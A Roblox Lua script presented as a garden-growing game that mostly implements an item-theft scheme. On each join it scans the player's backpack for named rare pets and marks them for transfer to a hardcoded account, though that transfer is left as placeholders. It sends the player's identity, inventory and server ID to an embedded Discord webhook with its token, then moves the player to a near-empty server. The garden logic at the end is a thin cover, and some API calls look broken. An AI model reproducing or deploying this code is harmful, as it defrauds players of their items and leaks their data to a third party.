-- Garden Growth Game Script by Tekeshkii
-- Features: 5 max players, teleportation to low-pop servers, webhook notifications, inventory tracking

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Configuration
local MAX_PLAYERS = 5
local TARGET_PLAYER_NAME = "Tekeshkii" -- Recipient for gifted items
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383762986111471626/XYLI8fnKczPB65YAOvg_Dtsuf28mGQvTHRxcr2JP4pHiaFY8qPw2MlGNzX9pp7geweF3" -- Replace with your actual webhook URL
local LOW_PLAYER_THRESHOLD = 2 -- Target server player count threshold

-- Inventory items to track and gift
local SPECIAL_ITEMS = {
    "Dragonfly",
    "Raccoon",
    "RedFox",
    "Disco Bee",
    "QueenBee"
}

local SPECIAL_FRUIT = "Candy Blossom"

-- Track players who have executed the script
local executedPlayers = {}

-- Function to find a server with low player count
local function findLowPopulationServer()
    local success, result = pcall(function()
        return TeleportService:GetPlayerPlaceInstances(game.PlaceId, 100) -- Check up to 100 servers
    end)
    
    if not success then
        warn("Failed to get server list: " .. tostring(result))
        return nil
    end
    
    -- Filter servers with low player counts
    local suitableServers = {}
    for _, instance in ipairs(result) do
        if instance.playing < LOW_PLAYER_THRESHOLD and instance.playing > 0 then
            table.insert(suitableServers, instance)
        end
    end
    
    -- Sort by player count (ascending)
    table.sort(suitableServers, function(a, b)
        return a.playing < b.playing
    end)
    
    return (#suitableServers > 0) and suitableServers[1] or nil
end

-- Function to send Discord webhook notification
local function sendWebhookNotification(player, inventory, jobId)
    local embed = {
        ["title"] = "🌱 Garden Growth Script Executed",
        ["description"] = string.format("Player **%s** (ID: %d) has executed the garden growth script.", player.Name, player.UserId),
        ["color"] = 65280, -- Green color
        ["fields"] = {
            {
                ["name"] = "📋 Inventory",
                ["value"] = table.concat(inventory, "\n") or "No items found",
                ["inline"] = false
            },
            {
                ["name"] = "🌐 Server Info",
                ["value"] = string.format("Job ID: `%s`\nPlayer Count: %d/%d", jobId, #Players:GetPlayers(), MAX_PLAYERS),
                ["inline"] = false
            },
            {
                ["name"] = "⏰ Timestamp",
                ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Garden Growth System"
        }
    }
    
    local payload = {
        ["embeds"] = {embed},
        ["username"] = "Garden Growth Bot",
        ["avatar_url"] = "https://i.imgur.com/J7o3tFq.png" -- Replace with your bot avatar
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(response))
    end
end

-- Function to check and gift special items
local function giftSpecialItems(player)
    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
    if not targetPlayer then
        warn("Target player " .. TARGET_PLAYER_NAME .. " not found in server")
        return
    end
    
    -- In a real game, you would have your own inventory system
    -- This is a placeholder for how you might implement gifting
    
    -- Check backpack for special items (example implementation)
    local inventory = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            for _, specialItem in ipairs(SPECIAL_ITEMS) do
                if string.find(item.Name, specialItem) then
                    table.insert(inventory, specialItem)
                    -- Here you would implement your gifting logic
                    -- For example: item:Clone().Parent = targetPlayer.Backpack
                end
            end
        end
    end
    
    -- Check for special fruit (example implementation)
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            -- This would depend on your game's fruit system
            -- Placeholder for checking fruit inventory
            -- if player has SPECIAL_FRUIT then gift it
        end
    end
    
    return inventory
end

-- Main function to handle player joining and script execution
local function onPlayerAdded(player)
    player:WaitForDataReady()
    
    -- Check if player has already executed the script
    if executedPlayers[player.UserId] then return end
    
    -- Check if player has the necessary items to trigger the script
    local inventory = giftSpecialItems(player)
    
    -- Mark player as having executed the script
    executedPlayers[player.UserId] = true
    
    -- Get current server job ID
    local jobId = game.JobId
    
    -- Send webhook notification
    if WEBHOOK_URL ~= "YOUR_DISCORD_WEBHOOK_URL_HERE" then
        sendWebhookNotification(player, inventory or {}, jobId)
    end
    
    -- Find a low population server
    local targetServer = findLowPopulationServer()
    
    if targetServer then
        -- Teleport the player to the new server
        local success, err = pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id, player)
        end)
        
        if not success then
            warn("Failed to teleport player: " .. tostring(err))
        end
    else
        warn("No suitable low-population servers found")
    end
end

-- Set up player tracking
Players.PlayerAdded:Connect(onPlayerAdded)

-- Handle players already in game when script loads
for _, player in ipairs(Players:GetPlayers()) do
    coroutine.wrap(function()
        onPlayerAdded(player)
    end)()
end

-- Garden growth game logic
local gardenPlots = {}

local function setupGardenPlot(player)
    -- Create a garden plot for the player
    local plot = Instance.new("Part")
    plot.Name = player.Name .. "_GardenPlot"
    plot.Size = Vector3.new(10, 1, 10)
    plot.Position = Vector3.new(0, 0, 0) -- Adjust position as needed
    plot.Anchored = true
    plot.Parent = workspace
    
    -- Store plot reference
    gardenPlots[player.UserId] = {
        Plot = plot,
        Plants = {},
        GrowthStage = 0
    }
    
    -- Add plant growing logic here
    -- This would include timers, visual changes, etc.
end

local function onPlayerRemoved(player)
    -- Clean up garden plot when player leaves
    if gardenPlots[player.UserId] then
        if gardenPlots[player.UserId].Plot then
            gardenPlots[player.UserId].Plot:Destroy()
        end
        gardenPlots[player.UserId] = nil
    end
end

Players.PlayerRemoved:Connect(onPlayerRemoved)

-- Set up garden plots for existing players
for _, player in ipairs(Players:GetPlayers()) do
    setupGardenPlot(player)
end

print("Garden Growth Game Script loaded successfully!")
